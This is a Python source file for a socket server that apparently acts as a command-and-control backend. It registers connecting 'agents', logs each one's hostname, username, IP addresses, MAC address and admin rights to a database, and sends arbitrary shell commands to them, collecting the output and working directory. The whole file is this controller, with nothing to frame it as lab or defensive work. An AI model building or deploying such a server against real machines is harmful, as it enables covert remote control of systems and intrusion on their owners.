import socket
import threading
import json
import time
import uuid
import os
import logging
from typing import Type
from db.engine import Engine
from db.models import agents_table, agent_id
from db.query import Insert, Select, Update
from logs import logger



class Server:
    def __init__(self, db_engine_class: Type[Engine], buffer_size: int = 1024) -> None:
        self.db_engine_class: Type[Engine] = db_engine_class
        self.buffer_size: int = buffer_size
        self.socket: socket = None
        self.is_running: bool = False
        self.host: str | None = None
        self.port: int | None = None
        self.server_thread: threading.Thread | None = None
        self.timeout_secs: int = 160
        self.check_offline_agents_time_secs: int = 60
        self.max_connections: int = 5
        self.connected_agents: dict[str, socket.socket] = {}

    def start(self, host: str = "0.0.0.0", port: int = 8080) -> None:
        """Binds the server to the given address, and listens for new connections."""

        if self.is_running:
            logger.error("Server is already running.")
            return

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((host, port))
        self.socket.listen(self.max_connections)

        self.is_running = True
        self.host = host
        self.port = port

        logging.info(f"Server successfully started on {host}:{port}.")

        # Accept new connection in separate thread
        self.server_thread = threading.Thread(target=self.accept_new_connections)
        self.server_thread.daemon = True
        self.server_thread.start()

    def stop(self) -> None:
        """Stops the server from listening for new connections."""

        if not self.is_running:
            logger.error("Server isn't running.")
            return

        if self.socket:
            try:
                self.socket.close()
            except Exception as e:
                raise Exception(f"Error closing server socket: {e}")
            self.socket = None

        self.is_running = False
        self.connected_agents = {}
        logger.info("Server stopped.")

    def accept_new_connections(self) -> None:

        while self.is_running:
            try:
                client_socket, address = self.socket.accept()
                logger.info(f"New connection from {address[0]}:{address[1]}.")

                # Handle new connection in a separate thread
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address)
                )
                thread.daemon = True
                thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.is_running:
                    raise Exception(e)

    def handle_client(self, client_socket: socket.socket, address: tuple[str, int]):
        """Handles a new connection."""

        logger.info(f"Stated handling new connection: {address[0]}:{address[1]}.")
        db_engine_thread = self.db_engine_class()
        db_engine_thread.open(os.getenv("DB_PATH"))

        try:
            raw_data: str = client_socket.recv(self.buffer_size).decode()
            initial_connection_info: dict = json.loads(raw_data)

            agent_uuid = initial_connection_info.get("agent_id")
            if agent_uuid is None:
                agent_uuid = str(uuid.uuid4())

            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            data = {
                "agent_id": agent_uuid,
                "name": initial_connection_info.get("hostname", "unknown"),
                "connection_time": current_time,
                "port": str(address[1]),
                "hostname": initial_connection_info.get("hostname", "unknown"),
                "cwd": initial_connection_info.get("cwd", "unknown"),
                "os_name": initial_connection_info.get("os_name", "unknown"),
                "os_version": initial_connection_info.get("os_version", "unknown"),
                "os_architecture": initial_connection_info.get("os_architecture", "unknown"),
                "local_ip": initial_connection_info.get("local_ip", "unknown"),
                "public_ip": initial_connection_info.get("public_ip", "unknown"),
                "mac_address": initial_connection_info.get("mac_address", "unknown"),
                "is_admin": initial_connection_info.get("is_admin", "unknown"),
                "username": initial_connection_info.get("username", "unknown")
            }

            # Check if agent exists in the database
            select = Select(agents_table).where((agent_id == agent_uuid))
            exists = list(db_engine_thread.execute(select))

            if exists:
                logger.info("Agent already exists, updating connection.")
                # Update existing agent
                update = Update(agents_table).set(data).where(agent_id == agent_uuid)
                db_engine_thread.execute(update)
            else:
                logger.info("Agent not found, creating new one.")
                # Insert new agent
                insert = Insert(agents_table).values([data])
                db_engine_thread.execute(insert)
                logger.info(f"New agent stored to agent table in db {address[0]}:{address[1]}, agent ID: {agent_uuid}.")

            # Send back the agent_id
            client_socket.send(json.dumps(agent_uuid).encode())

            # Save to db
            db_engine_thread.commit()

            # Store agent socket
            self.connected_agents[agent_uuid] = client_socket

        except Exception as e:
            logging.log(logging.ERROR, f"Error handling client {address[0]}:{address[1]}: {e}")
        finally:
            db_engine_thread.close()

    def interact_with_agent(self, agent_uid: str, command: str) -> dict:

        logging.info(f"New command to {agent_uid}.")
        if agent_uid not in self.connected_agents:
            return {
                "status": False,
                "command_response": None,
                "cwd": None,
            }

        if command is None:
            command = "test"

        agent_socket = self.connected_agents[agent_uid]  # Get agent socket.
        agent_socket.send(json.dumps(command).encode())  # Send command.
        response = json.loads(agent_socket.recv(self.buffer_size).decode())  # Receive response.

        if response:
            return {
                "status": True,
                "command_response": response["command_response"],
                "cwd": response["cwd"],
            }

        return {
            "status": False,
            "command_response": None,
            "cwd": None,
        }
